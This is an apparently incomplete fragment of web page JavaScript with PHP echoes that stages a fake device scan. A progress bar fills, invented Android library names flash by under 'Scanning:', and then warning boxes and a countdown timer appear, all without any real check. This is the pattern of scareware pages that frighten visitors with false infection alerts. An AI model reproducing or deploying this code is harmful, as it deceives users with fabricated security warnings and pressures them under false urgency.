<script>
var seconds = 43;
function secondPassed() {
    if (seconds == '00') {
        document.getElementById('countdown').innerHTML = " <?php echo $line15;?>";
    } else {
        if (seconds < 10) {
        document.getElementById('countdown').innerHTML = "0" + seconds +"  seconds";
        } else {
        document.getElementById('countdown').innerHTML = seconds +"  seconds";
        }
    }
  if (seconds == 0) {
    clearInterval(countdownTimer);
  } else {
    seconds--;
  }
}
    function start() {

        var titmecount = 1;
        var processDiv= document.getElementById("process");
        var processText= document.getElementById("loading-bar-text");
        setInterval(function () {
        if (titmecount <= 100) {
          processBar();
        }
        titmecount++;
        if (titmecount == 100) {
          warningDiv.style.display = 'block';
          warningDiv2.style.display = 'block';
          scanningDiv.innerHTML = "<b><?php echo $line10;?></b>";
          countdownTimer = setInterval('secondPassed()', 1000);
        }
        },15);
        function processBar () {
        processDiv.style.width = titmecount +"%";
        processText.innerHTML = (titmecount +"%");
        }


      var scanningDiv= document.getElementById("scanning");
      var warningDiv= document.getElementById("warning");
      var warningDiv2 = document.getElementById("warning-2");
      var index  = 0;
      var fruits = ["2droid.lib.flash378", "7droid.lib.messages", "8droid.lib.drive198", "3droid.lib.appli378"];
      setInterval(function () {
        if (index == fruits.length ) {
          index = 0;
        }
        if (titmecount < 100) {
          Scanning();
        }
        index++;
      }, 50);

      function Scanning () {
        scanningDiv.innerHTML = "Scanning: "+ fruits[index];
      };
  };
var btns = document.getElementById("btn0");
